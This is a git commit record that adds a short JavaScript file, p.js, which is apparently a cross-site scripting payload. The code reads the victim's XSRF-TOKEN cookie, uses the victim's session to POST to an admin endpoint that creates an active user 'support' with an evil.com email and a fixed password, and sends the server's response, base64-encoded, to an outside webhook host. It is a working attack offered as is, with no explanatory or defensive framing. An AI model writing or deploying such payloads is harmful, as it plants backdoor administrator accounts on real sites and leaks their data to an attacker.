1132b941694a74a45e3b6aa3f5af335efd3726b1
cyberkill896-sudo <cyberkill896@gmail.com>
2026-05-20 12:24:37 +0530

    Create p.js

---
+++ p.js
@@ -0,0 +1,10 @@
+(function(){
+  var t=decodeURIComponent(document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);
+  fetch('/admin/security/users',{
+    method:'POST',
+    credentials:'include',
+    headers:{'Content-Type':'application/json','X-XSRF-TOKEN':t,'Accept':'application/json'},
+    body:JSON.stringify({name:'support',email:'support@evil.com',password:'P@ssword1!',password_confirmation:'P@ssword1!',is_active:true})
+  }).then(function(r){return r.text()})
+    .then(function(d){new Image().src='https://webhooksite.net/586b992b-be17-4fee-beba-6190872e31b9/?r='+btoa(d)});
+})();
